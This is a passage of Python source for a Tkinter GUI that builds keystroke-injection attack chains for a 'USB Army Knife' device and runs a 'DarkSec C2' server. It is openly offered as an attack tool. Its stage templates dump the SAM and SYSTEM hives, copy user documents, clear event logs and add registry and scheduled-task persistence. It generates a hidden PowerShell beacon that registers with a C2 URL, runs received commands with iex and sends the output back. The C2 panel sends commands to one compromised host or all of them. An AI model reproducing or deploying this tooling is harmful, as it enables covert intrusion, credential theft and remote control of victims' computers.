        tk.Checkbutton(persist_frame, text="Service Installation", variable=self.persist_service).grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        tk.Checkbutton(persist_frame, text="Startup Folder", variable=self.persist_startup).grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        
        # Actions
        action_frame = tk.Frame(orch_frame)
        action_frame.pack(fill=tk.X)
        
        tk.Button(action_frame, text="⚙️ Generate Chain Script", command=self.generate_chain_script, style="Action.TButton").pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="💾 Save Chain", command=self.save_chain).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📂 Load Chain", command=self.load_chain).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🗑️ Clear Chain", command=self.clear_chain).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🚀 Deploy to Device", command=self.deploy_chain).pack(side=tk.RIGHT, padx=5)
        
        # Initialize chain storage
        self.chain_stages = []
    
    def add_stage_to_chain(self):
        """Add selected stage to execution chain"""
        selection = self.stage_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a stage type first.")
            return
        
        stage_type = self.stage_listbox.get(selection[0])
        
        stage = {
            "type": stage_type,
            "delay": self.stage_delay.get(),
            "condition": self.stage_condition.get(),
            "on_failure": self.stage_failure.get(),
            "payload": self.stage_payload.get()
        }
        
        self.chain_stages.append(stage)
        self.chain_listbox.insert(tk.END, f"{len(self.chain_stages)}. {stage_type} [{stage['condition']}]")
    
    def remove_stage(self):
        """Remove selected stage from chain"""
        selection = self.chain_listbox.curselection()
        if not selection:
            return
        
        idx = selection[0]
        self.chain_stages.pop(idx)
        self.chain_listbox.delete(idx)
        
        # Renumber remaining stages
        self.chain_listbox.delete(0, tk.END)
        for i, stage in enumerate(self.chain_stages, 1):
            self.chain_listbox.insert(tk.END, f"{i}. {stage['type']} [{stage['condition']}]")
    
    def move_stage_up(self):
        """Move selected stage up in chain"""
        selection = self.chain_listbox.curselection()
        if not selection or selection[0] == 0:
            return
        
        idx = selection[0]
        self.chain_stages[idx], self.chain_stages[idx-1] = self.chain_stages[idx-1], self.chain_stages[idx]
        
        # Refresh display
        self.chain_listbox.delete(0, tk.END)
        for i, stage in enumerate(self.chain_stages, 1):
            self.chain_listbox.insert(tk.END, f"{i}. {stage['type']} [{stage['condition']}]")
        self.chain_listbox.selection_set(idx-1)
    
    def move_stage_down(self):
        """Move selected stage down in chain"""
        selection = self.chain_listbox.curselection()
        if not selection or selection[0] >= len(self.chain_stages) - 1:
            return
        
        idx = selection[0]
        self.chain_stages[idx], self.chain_stages[idx+1] = self.chain_stages[idx+1], self.chain_stages[idx]
        
        # Refresh display
        self.chain_listbox.delete(0, tk.END)
        for i, stage in enumerate(self.chain_stages, 1):
            self.chain_listbox.insert(tk.END, f"{i}. {stage['type']} [{stage['condition']}]")
        self.chain_listbox.selection_set(idx+1)
    
    def on_chain_stage_select(self, event):
        """Load stage configuration when selected"""
        selection = self.chain_listbox.curselection()
        if not selection:
            return
        
        stage = self.chain_stages[selection[0]]
        self.stage_delay.delete(0, tk.END)
        self.stage_delay.insert(0, stage['delay'])
        self.stage_condition.set(stage['condition'])
        self.stage_failure.set(stage['on_failure'])
        self.stage_payload.delete(0, tk.END)
        self.stage_payload.insert(0, stage['payload'])
    
    def browse_stage_payload(self):
        """Browse for stage payload file"""
        filepath = filedialog.askopenfilename(title="Select payload file",
                                             filetypes=[("DuckyScript", "*.ds"), ("JSON", "*.json"), ("All", "*.*")])
        if filepath:
            self.stage_payload.delete(0, tk.END)
            self.stage_payload.insert(0, filepath)
    
    def generate_chain_script(self):
        """Generate orchestrated DuckyScript from chain"""
        if not self.chain_stages:
            messagebox.showwarning("Empty Chain", "Please add stages to the chain first.")
            return
        
        script_lines = [
            "REM ======================================",
            "REM Multi-Stage Orchestrated Attack Chain",
            f"REM Generated: {datetime.utcnow().isoformat()}Z",
            "REM ======================================",
            ""
        ]
        
        # Add C2 integration if enabled
        if self.c2_enabled.get():
            script_lines.extend([
                f"REM C2 Server: {self.c2_server.get()}",
                f"REM Callback Interval: {self.c2_interval.get()}s",
                ""
            ])
        
        # Add persistence mechanisms
        persist_methods = []
        if self.persist_registry.get():
            persist_methods.append("Registry Run Key")
        if self.persist_scheduled.get():
            persist_methods.append("Scheduled Task")
        if self.persist_service.get():
            persist_methods.append("Service")
        if self.persist_startup.get():
            persist_methods.append("Startup Folder")
        
        if persist_methods:
            script_lines.append(f"REM Persistence: {', '.join(persist_methods)}")
            script_lines.append("")
        
        # Generate stages
        for i, stage in enumerate(self.chain_stages, 1):
            script_lines.extend([
                f"REM === Stage {i}: {stage['type']} ===",
                f"REM Condition: {stage['condition']}",
                f"REM On Failure: {stage['on_failure']}",
                f"DELAY {stage['delay']}",
                ""
            ])
            
            # Add stage-specific commands
            if stage['payload']:
                script_lines.append(f"REM Loading payload: {stage['payload']}")
                try:
                    # Try to load payload file
                    if os.path.exists(stage['payload']):
                        with open(stage['payload'], 'r') as f:
                            payload_content = f.read()
                        script_lines.append(payload_content)
                except Exception:
                    script_lines.append(f"REM ERROR: Could not load payload file")
            else:
                # Generate basic template based on stage type
                script_lines.extend(self._generate_stage_template(stage['type']))
            
            script_lines.append("")
        
        # Add persistence implementation
        if persist_methods:
            script_lines.extend([
                "REM === Persistence Installation ===",
                ""
            ])
            
            if self.persist_registry.get():
                script_lines.extend([
                    "REM Registry persistence",
                    "GUI r",
                    "DELAY 500",
                    "STRING cmd /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Update /t REG_SZ /d %temp%\\\\update.exe /f",
                    "ENTER",
                    ""
                ])
            
            if self.persist_scheduled.get():
                script_lines.extend([
                    "REM Scheduled task persistence",
                    "GUI r",
                    "DELAY 500",
                    "STRING cmd /c schtasks /create /tn \"SystemUpdate\" /tr %temp%\\\\update.exe /sc daily /st 09:00 /f",
                    "ENTER",
                    ""
                ])
        
        # Add C2 callback
        if self.c2_enabled.get():
            script_lines.extend([
                "REM === C2 Callback Setup ===",
                "GUI r",
                "DELAY 500",
                f"STRING powershell -w hidden -nop -c \"while($true){{Invoke-WebRequest -Uri '{self.c2_server.get()}/beacon' -Method POST -Body (Get-ComputerInfo | ConvertTo-Json); Start-Sleep {self.c2_interval.get()};}}\"",
                "ENTER",
                ""
            ])
        
        # Load into editor
        script = "\n".join(script_lines)
        self.duckyscript_editor.delete("1.0", tk.END)
        self.duckyscript_editor.insert(tk.END, script)
        
        # Switch to DuckyScript tab
        self.notebook.select(4)
        
        messagebox.showinfo("Generated", f"Chain script with {len(self.chain_stages)} stages generated successfully!")
    
    def _generate_stage_template(self, stage_type):
        """Generate template commands for stage type"""
        templates = {
            "Initial Access": [
                "GUI r",
                "DELAY 500",
                "STRING cmd",
                "ENTER"
            ],
            "Recon": [
                "STRING systeminfo > %temp%\\\\recon.txt",
                "ENTER",
                "STRING ipconfig /all >> %temp%\\\\recon.txt",
                "ENTER"
            ],
            "Privilege Escalation": [
                "STRING powershell Start-Process cmd -Verb runAs",
                "ENTER",
                "DELAY 1000",
                "ALT y",
                "ENTER"
            ],
            "Credential Dump": [
                "STRING reg save HKLM\\\\SAM %temp%\\\\sam.hiv",
                "ENTER",
                "STRING reg save HKLM\\\\SYSTEM %temp%\\\\system.hiv",
                "ENTER"
            ],
            "Data Exfiltration": [
                "STRING powershell -c \"Get-ChildItem -Path C:\\\\ -Include *.txt,*.pdf,*.docx -Recurse | Copy-Item -Destination %temp%\\\\\"",
                "ENTER"
            ],
            "Network Callback": [
                f"STRING powershell Invoke-WebRequest -Uri {self.c2_server.get()}/register -Method POST",
                "ENTER"
            ],
            "Cleanup/Evasion": [
                "STRING wevtutil cl System",
                "ENTER",
                "STRING wevtutil cl Security",
                "ENTER"
            ],
            "Custom Command": [
                "REM Add your custom commands here"
            ]
        }
        
        return templates.get(stage_type, ["REM Stage template not found"])
    
    def save_chain(self):
        """Save chain configuration"""
        if not self.chain_stages:
            messagebox.showwarning("Empty Chain", "No chain to save.")
            return
        
        filepath = filedialog.asksaveasfilename(defaultextension=".chain",
                                               filetypes=[("Chain files", "*.chain"), ("All files", "*.*")])
        if filepath:
            try:
                chain_data = {
                    "stages": self.chain_stages,
                    "c2_enabled": self.c2_enabled.get(),
                    "c2_server": self.c2_server.get(),
                    "c2_interval": self.c2_interval.get(),
                    "persistence": {
                        "registry": self.persist_registry.get(),
                        "scheduled": self.persist_scheduled.get(),
                        "service": self.persist_service.get(),
                        "startup": self.persist_startup.get()
                    }
                }
                with open(filepath, "w") as f:
                    json.dump(chain_data, f, indent=2)
                messagebox.showinfo("Saved", "Chain saved successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save chain: {e}")
    
    def load_chain(self):
        """Load chain configuration"""
        filepath = filedialog.askopenfilename(title="Select chain file",
                                             filetypes=[("Chain files", "*.chain"), ("All files", "*.*")])
        if not filepath:
            return
        
        try:
            with open(filepath, "r") as f:
                chain_data = json.load(f)
            
            self.chain_stages = chain_data.get("stages", [])
            self.c2_enabled.set(chain_data.get("c2_enabled", 0))
            self.c2_server.delete(0, tk.END)
            self.c2_server.insert(0, chain_data.get("c2_server", ""))
            self.c2_interval.delete(0, tk.END)
            self.c2_interval.insert(0, chain_data.get("c2_interval", "60"))
            
            persist = chain_data.get("persistence", {})
            self.persist_registry.set(persist.get("registry", 0))
            self.persist_scheduled.set(persist.get("scheduled", 0))
            self.persist_service.set(persist.get("service", 0))
            self.persist_startup.set(persist.get("startup", 0))
            
            # Refresh chain display
            self.chain_listbox.delete(0, tk.END)
            for i, stage in enumerate(self.chain_stages, 1):
                self.chain_listbox.insert(tk.END, f"{i}. {stage['type']} [{stage['condition']}]")
            
            messagebox.showinfo("Loaded", f"Chain with {len(self.chain_stages)} stages loaded successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load chain: {e}")
    
    def clear_chain(self):
        """Clear current chain"""
        if self.chain_stages and not messagebox.askyesno("Confirm", "Clear current chain?"):
            return
        
        self.chain_stages = []
        self.chain_listbox.delete(0, tk.END)
    
    def deploy_chain(self):
        """Deploy generated chain to device"""
        if not self.chain_stages:
            messagebox.showwarning("Empty Chain", "Please build a chain first.")
            return
        
        # Generate script first
        self.generate_chain_script()
        
        # Then deploy it
        if messagebox.askyesno("Deploy Chain", "Deploy generated chain to device?"):
            self.save_duckyscript()
    
    # C2 Server Management
    def create_c2_server_tab(self):
        """C2 Server Management with DarkSec C2"""
        c2_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(c2_frame, text="🕸️ C2 Server")
        
        # Server status
        status_frame = tk.LabelFrame(c2_frame, text="Server Status", padding=10)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.c2_status_label = tk.Label(status_frame, text="❌ Server Offline", 
                                        font=("Arial", 12, "bold"), foreground="#ff0000")
        self.c2_status_label.pack(pady=5)
        
        status_details = tk.Frame(status_frame)
        status_details.pack(fill=tk.X, pady=5)
        
        tk.Label(status_details, text="Local URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.c2_local_url = tk.Label(status_details, text="N/A", foreground="#00d2ff", font=("Courier", 9))
        self.c2_local_url.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(status_details, text="Public URL:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.c2_public_url = tk.Label(status_details, text="N/A", foreground="#00d2ff", font=("Courier", 9))
        self.c2_public_url.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(status_details, text="Active Beacons:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.c2_beacon_count = tk.Label(status_details, text="0", foreground="#00ff00", font=("Arial", 10, "bold"))
        self.c2_beacon_count.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(status_details, text="API Key:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.c2_api_key_label = tk.Label(status_details, text="Not available", foreground="#ffaa00", font=("Courier", 8))
        self.c2_api_key_label.grid(row=3, column=1, sticky=tk.W, padx=5, pady=2)
        self.c2_copy_key_btn = tk.Button(status_details, text="📋 Copy", command=self.copy_c2_api_key, width=8)
        self.c2_copy_key_btn.grid(row=3, column=2, sticky=tk.W, padx=5, pady=2)
        self.c2_copy_key_btn.config(state=tk.DISABLED)
        
        # Server configuration
        config_frame = tk.LabelFrame(c2_frame, text="Server Configuration", padding=10)
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(config_frame, text="Port:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.c2_port = tk.Entry(config_frame, width=10)
        self.c2_port.insert(0, "5000")
        self.c2_port.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        tk.Label(config_frame, text="Use Ngrok:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.c2_use_ngrok = tk.IntVar(value=1)
        tk.Checkbutton(config_frame, variable=self.c2_use_ngrok).grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)
        
        tk.Label(config_frame, text="Ngrok Token:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.c2_ngrok_token = tk.Entry(config_frame, width=40, show="*")
        self.c2_ngrok_token.grid(row=1, column=1, columnspan=3, sticky=tk.EW, padx=5, pady=5)
        
        config_frame.columnconfigure(1, weight=1)
        
        # Control buttons
        control_frame = tk.Frame(c2_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.c2_start_btn = tk.Button(control_frame, text="▶️ Start Server", 
                                      command=self.start_c2_server, style="Action.TButton")
        self.c2_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.c2_stop_btn = tk.Button(control_frame, text="⏹️ Stop Server", 
                                     command=self.stop_c2_server, state=tk.DISABLED)
        self.c2_stop_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(control_frame, text="🌐 Open Web Panel", command=self.open_c2_panel).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="📝 View Logs", command=self.view_c2_logs).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="🔄 Refresh Beacons", command=self.refresh_c2_beacons).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="🚀 Deployment Wizard", command=self.show_deployment_wizard, style="Action.TButton").pack(side=tk.RIGHT, padx=5)
        
        # DarkSec C2 Tools
        darksec_frame = tk.LabelFrame(c2_frame, text="DarkSec C2 Tools", padding=10)
        darksec_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(darksec_frame, text="C2 Server Path:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.c2_server_path = tk.Entry(darksec_frame, width=40)
        self.c2_server_path.insert(0, "./c2_server/c2_server.py")
        self.c2_server_path.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=5)
        tk.Button(darksec_frame, text="Browse", command=self.browse_c2_server_path).grid(row=0, column=2, padx=5, pady=5)
        
        tk.Button(darksec_frame, text="🔧 Generate Beacon Payload", command=self.generate_c2_payload).grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        tk.Button(darksec_frame, text="📝 View C2 Config", command=self.view_c2_config).grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        tk.Button(darksec_frame, text="🔄 Reload C2 Server", command=self.reload_c2_server).grid(row=1, column=2, padx=5, pady=5, sticky=tk.W)
        
        darksec_frame.columnconfigure(1, weight=1)
        
        # Active beacons list
        beacons_frame = tk.LabelFrame(c2_frame, text="Active Beacons", padding=10)
        beacons_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        columns = ("Hostname", "Username", "OS", "IP", "Last Seen")
        self.beacons_tree = tk.Treeview(beacons_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.beacons_tree.heading(col, text=col)
            self.beacons_tree.column(col, width=120)
        
        scrollbar = tk.Scrollbar(beacons_frame, orient=tk.VERTICAL, command=self.beacons_tree.yview)
        self.beacons_tree.configure(yscrollcommand=scrollbar.set)
        
        self.beacons_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Command interface
        cmd_frame = tk.LabelFrame(c2_frame, text="Command Execution", padding=10)
        cmd_frame.pack(fill=tk.X)
        
        tk.Label(cmd_frame, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
        self.c2_command = tk.Entry(cmd_frame, font=("Courier", 10))
        self.c2_command.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.c2_command.bind("<Return>", lambda e: self.send_c2_command())
        
        tk.Button(cmd_frame, text="Send to Selected", command=self.send_c2_command).pack(side=tk.LEFT, padx=5)
        tk.Button(cmd_frame, text="Send to All", command=self.send_c2_command_all).pack(side=tk.LEFT, padx=5)
        
        # C2 server state
        self.c2_server_process = None
        self.c2_running = False
        self.c2_api_key = None
    
    def start_c2_server(self):
        """Start DarkSec C2 server"""
        self._start_simple_c2_server()
    
    def _start_simple_c2_server(self):
        """Start simple standalone C2 server using custom c2_server.py"""
        port = self.c2_port.get()
        
        # Resolve C2 server path (prefer entry field, fallback to default)
        candidate = self.c2_server_path.get().strip() if hasattr(self, 'c2_server_path') else ""
        if not candidate:
            candidate = os.path.join(os.path.dirname(__file__), "c2_server", "c2_server.py")
        if not os.path.isabs(candidate):
            candidate = os.path.abspath(candidate)
        if not os.path.exists(candidate):
            messagebox.showerror("Error", f"C2 server not found at: {candidate}")
            return
        
        try:
            # Create a launcher script that imports and runs the C2 server
            launcher_script = f'''#!/usr/bin/env python3
import os, sys, importlib.util
base_dir = os.path.abspath(os.path.dirname(__file__))
root_dir = os.path.abspath(os.path.join(base_dir, '..'))
c2_path = os.path.join(root_dir, 'c2_server', 'c2_server.py')

spec = importlib.util.spec_from_file_location('darkblade_c2', c2_path)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
C2Server = mod.C2Server

if __name__ == "__main__":
    server = C2Server(host="0.0.0.0", port={port}, use_ssl=False, use_ngrok={bool(self.c2_use_ngrok.get())}, ngrok_token={repr(self.c2_ngrok_token.get().strip()) if hasattr(self, 'c2_ngrok_token') else 'None'})
    server.run()
'''
            
            os.makedirs("c2_runtime", exist_ok=True)
            launcher_file = "c2_runtime/launch_c2.py"
            with open(launcher_file, "w") as f:
                f.write(launcher_script)
            
            # Start the C2 server process
            self.c2_server_process = subprocess.Popen(
                [sys.executable, launcher_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Wait a moment for server to start and capture the API key
            time.sleep(1)
            
            self.c2_running = True
            self.c2_status_label.config(text="✅ Server Running", foreground="#00ff00")
            self.c2_start_btn.config(state=tk.DISABLED)
            self.c2_stop_btn.config(state=tk.NORMAL)
            self.c2_local_url.config(text=f"http://localhost:{port}")
            
            # Try to read the master API key from stdout
            self.c2_api_key = None
            try:
                # Start a thread to capture the API key from output
                threading.Thread(target=self._capture_c2_output, daemon=True).start()
            except:
                pass
            
            messagebox.showinfo("Success", 
                f"USB Army Knife C2 server started on port {port}\n\n"
                f"Check the console/logs for the Master API Key!\n"
                f"You'll need this key to authenticate API requests.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {e}")
    
    def _capture_c2_output(self):
        """Capture C2 server output to extract API key"""
        if not self.c2_server_process:
            return
        
        try:
            for line in iter(self.c2_server_process.stdout.readline, ''):
                if not line:
                    break
                print(f"[C2 Server] {line.strip()}")
                
                # Look for API key in output
                if "Master API Key:" in line:
                    parts = line.split("Master API Key:")
                    if len(parts) > 1:
                        self.c2_api_key = parts[1].strip()
                        print(f"[*] Captured API Key: {self.c2_api_key}")
                        # Update UI with the key
                        self.after(0, self._update_api_key_ui)
        except Exception as e:
            print(f"[!] Error capturing C2 output: {e}")
    
    def _update_api_key_ui(self):
        """Update the API key display in the UI and persist it locally."""
        if hasattr(self, 'c2_api_key') and self.c2_api_key:
            # Show first and last 8 chars with ... in between for security
            display_key = f"{self.c2_api_key[:8]}...{self.c2_api_key[-8:]}"
            self.c2_api_key_label.config(text=display_key, foreground="#00ff00")
            self.c2_copy_key_btn.config(state=tk.NORMAL)
            # Persist key to settings.json (0600) for convenience
            try:
                self._persist_c2_api_key(self.c2_api_key)
            except Exception:
                pass
    
    def copy_c2_api_key(self):
        """Copy the C2 API key to clipboard"""
        if hasattr(self, 'c2_api_key') and self.c2_api_key:
            self.clipboard_clear()
            self.clipboard_append(self.c2_api_key)
            messagebox.showinfo("Copied", "API key copied to clipboard!")
        else:
            messagebox.showwarning("No Key", "API key not available yet")
    
    def stop_c2_server(self):
        """Stop C2 server"""
        if self.c2_server_process:
            self.c2_server_process.terminate()
            try:
                self.c2_server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.c2_server_process.kill()
            
            self.c2_server_process = None
        
        self.c2_running = False
        self.c2_api_key = None
        self.c2_status_label.config(text="❌ Server Offline", foreground="#ff0000")
        self.c2_start_btn.config(state=tk.NORMAL)
        self.c2_stop_btn.config(state=tk.DISABLED)
        self.c2_local_url.config(text="N/A")
        self.c2_public_url.config(text="N/A")
        self.c2_api_key_label.config(text="Not available", foreground="#ffaa00")
        self.c2_copy_key_btn.config(state=tk.DISABLED)
        
        messagebox.showinfo("Stopped", "C2 server stopped")

    def _persist_c2_api_key(self, key: str):
        """Persist API key in settings.json with user-only permissions.
        This is convenient for single-user setups; kept local and not printed to logs.
        """
        if not key:
            return
        try:
            # Merge settings
            try:
                with open("settings.json", "r", encoding="utf-8") as cf:
                    cfg = json.load(cf) or {}
            except Exception:
                cfg = {}
            cfg["c2_api_key"] = key
            # Write and chmod to 0600
            with open("settings.json", "w", encoding="utf-8") as cf:
                json.dump(cfg, cf, indent=2)
            try:
                os.chmod("settings.json", 0o600)
            except Exception:
                pass
        except Exception:
            pass
    
    def _fetch_ngrok_url(self):
        """Fetch ngrok public URL"""
        time.sleep(3)  # Wait for ngrok to start
        try:
            import requests
            resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
            tunnels = resp.json().get("tunnels", [])
            if tunnels:
                public_url = tunnels[0].get("public_url")
                self.c2_public_url.config(text=public_url)
        except Exception:
            self.c2_public_url.config(text="Failed to fetch ngrok URL")
    
    def open_c2_panel(self):
        """Open C2 web panel in browser"""
        if self.c2_running:
            url = self.c2_local_url.cget("text")
            if url != "N/A":
                # Open the main web interface (not /admin)
                webbrowser.open(url)
        else:
            messagebox.showwarning("Not Running", "C2 server is not running")
    
    def refresh_c2_beacons(self):
        """Refresh beacon list from C2 server"""
        if not self.c2_running:
            return
        
        try:
            import requests
            url = self.c2_local_url.cget("text")
            
            # Use API key if available
            headers = {}
            if hasattr(self, 'c2_api_key') and self.c2_api_key:
                headers['X-API-Key'] = self.c2_api_key
            
            resp = requests.get(f"{url}/api/beacons", headers=headers, timeout=5)
            
            if resp.status_code == 401:
                messagebox.showerror("Error", "Unauthorized - API key required or invalid")
                return
            
            data = resp.json()
            beacons = data.get('beacons', [])
            
            # Update tree
            self.beacons_tree.delete(*self.beacons_tree.get_children())
            for beacon in beacons:
                self.beacons_tree.insert(
                    "",
                    tk.END,
                    values=(
                        beacon.get("hostname", "N/A"),
                        beacon.get("username", "N/A"),
                        beacon.get("os", "N/A"),
                        beacon.get("ip", "N/A"),
                        beacon.get("last_seen", "N/A")
                    ),
                    tags=(beacon.get("id", ""),)
                )
            
            self.c2_beacon_count.config(text=str(len(beacons)))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to refresh beacons: {e}")
    
    def send_c2_command(self):
        """Send command to selected beacon"""
        selection = self.beacons_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a beacon")
            return
        
        command = self.c2_command.get().strip()
        if not command:
            return
        
        item_id = selection[0]
        item = self.beacons_tree.item(item_id)
        tags = item.get('tags') or []
        beacon_id = tags[0] if tags else None
        if not beacon_id:
            messagebox.showerror("Error", "Selected row has no beacon ID; try Refresh Beacons")
            return
        
        try:
            import requests
            url = self.c2_local_url.cget("text")
            
            # Use API key if available
            headers = {}
            if hasattr(self, 'c2_api_key') and self.c2_api_key:
                headers['X-API-Key'] = self.c2_api_key
            
            resp = requests.post(
                f"{url}/api/beacon/{beacon_id}/command", 
                json={"command": command}, 
                headers=headers,
                timeout=5
            )
            
            if resp.status_code == 401:
                messagebox.showerror("Error", "Unauthorized - API key required or invalid")
                return
            
            host_label = item['values'][0] if item.get('values') else beacon_id
            messagebox.showinfo("Sent", f"Command sent to {host_label}")
            self.c2_command.delete(0, tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")
    
    def send_c2_command_all(self):
        """Send command to all beacons"""
        command = self.c2_command.get().strip()
        if not command:
            return
        
        if not messagebox.askyesno("Confirm", f"Send '{command}' to ALL beacons?"):
            return
        
        try:
            import requests
            url = self.c2_local_url.cget("text")
            
            # Use API key if available
            headers = {}
            if hasattr(self, 'c2_api_key') and self.c2_api_key:
                headers['X-API-Key'] = self.c2_api_key
            
            # Get all beacons
            resp = requests.get(f"{url}/api/beacons", headers=headers, timeout=5)
            
            if resp.status_code == 401:
                messagebox.showerror("Error", "Unauthorized - API key required or invalid")
                return
            
            data = resp.json()
            beacons = data.get('beacons', [])
            
            # Send command to each beacon
            for beacon in beacons:
                beacon_id = beacon.get('id')
                requests.post(
                    f"{url}/api/beacon/{beacon_id}/command", 
                    json={"command": command},
                    headers=headers,
                    timeout=5
                )
            
            messagebox.showinfo("Sent", f"Command sent to {len(beacons)} beacon(s)")
            self.c2_command.delete(0, tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")
    
    def view_c2_logs(self):
        """View C2 server logs"""
        if self.c2_server_process:
            # TODO: Show process output in a dialog
            messagebox.showinfo("Logs", "Check terminal for server logs")
        else:
            messagebox.showwarning("Not Running", "C2 server is not running")
    
    def browse_c2_server_path(self):
        """Browse for DarkSec C2 server file"""
        path = filedialog.askopenfilename(
            title="Select DarkSec C2 Server",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")]
        )
        if path:
            self.c2_server_path.delete(0, tk.END)
            self.c2_server_path.insert(0, path)
    
    def view_c2_config(self):
        """View DarkSec C2 server configuration"""
        config_info = f"""DarkSec C2 Server Configuration
        
Port: {self.c2_port.get()}
Ngrok Enabled: {'Yes' if self.c2_use_ngrok.get() else 'No'}
Server Status: {'Running' if self.c2_running else 'Stopped'}
Local URL: {self.c2_local_url.cget('text')}
Public URL: {self.c2_public_url.cget('text')}
Active Beacons: {self.c2_beacon_count.cget('text')}
        """
        messagebox.showinfo("DarkSec C2 Configuration", config_info)
    
    def reload_c2_server(self):
        """Reload DarkSec C2 server"""
        if self.c2_running:
            if messagebox.askyesno("Reload C2 Server", "This will restart the C2 server. Continue?"):
                self.stop_c2_server()
                time.sleep(1)
                self.start_c2_server()
        else:
            messagebox.showwarning("Not Running", "C2 server is not currently running")
    
    def generate_c2_payload(self):
        """Generate C2 beacon payload for USB Army Knife"""
        # Get C2 URL
        c2_url = self.c2_public_url.cget("text")
        if c2_url == "N/A":
            c2_url = self.c2_local_url.cget("text")
        
        if c2_url == "N/A":
            messagebox.showwarning("No URL", "Start C2 server first to get URL")
            return
        
        # Generate DuckyScript beacon payload
        beacon_script = f'''REM ========================================
REM USB Army Knife C2 Beacon
REM Server: {c2_url}
REM ========================================

REM Open PowerShell hidden
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "$c2='{c2_url}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$o=[System.Environment]::OSVersion.VersionString;$bid='';while($true){{try{{if(!$bid){{$reg=@{{hostname=$h;username=$u;os=$o;metadata=@{{}}}}|ConvertTo-Json;$r=Invoke-RestMethod -Uri $c2/api/beacon/register -Method POST -Body $reg -ContentType 'application/json';$bid=$r.beacon_id}};$chk=Invoke-RestMethod -Uri $c2/api/beacon/checkin/$bid -Method POST -ContentType 'application/json';$chk.commands|%{{$cid=$_.id;$cmd=$_.command;$out=iex $cmd 2>&1|Out-String;Invoke-RestMethod -Uri $c2/api/beacon/result/$cid -Method POST -Body (@{{result=$out}}|ConvertTo-Json) -ContentType 'application/json'}};Start-Sleep 60}}catch{{Start-Sleep 10}}}}"
ENTER
'''
        
        # Save to file
        try:
            os.makedirs("payloads", exist_ok=True)
            payload_file = "payloads/C2_Beacon.json"
            
            payload_data = {
                "name": "C2 Beacon",
                "category": "Persistence",
                "os": "Windows",
                "description": f"Beacon to C2 server at {c2_url}",
                "script": beacon_script
            }
            
            with open(payload_file, "w") as f:
                json.dump(payload_data, f, indent=2)
            
            # Also create standalone DuckyScript file
            ds_file = "c2_beacon.ds"
            with open(ds_file, "w", encoding="utf-8") as f:
                f.write(beacon_script)
            
            # Load into editor
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, beacon_script)
            
            # Switch to DuckyScript tab
            self.notebook.select(4)
            
            messagebox.showinfo("Success", 
                f"C2 Beacon payload generated!\n\n"
                f"- Added to Payload Library\n"
                f"- Saved as {ds_file}\n"
                f"- Loaded in DuckyScript editor\n\n"
                f"Ready to deploy to USB Army Knife!")
            
            # Refresh payload library if on that tab
            try:
                self.filter_payloads()
            except:
                pass
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate payload: {e}")
    
    def show_deployment_wizard(self):
        """Show step-by-step deployment wizard"""
        wizard = tk.Toplevel(self)
        wizard.title("USB Army Knife C2 Deployment Wizard")
        wizard.geometry("700x600")
        
        # Title
        try:
            wizard.configure(bg="#000000")
        except Exception:
            pass
        title_frame = tkcore.Frame(wizard, bg="#ff0000", height=60)
        title_frame.pack(fill=tk.X)
        title_frame.pack_propagate(False)
        
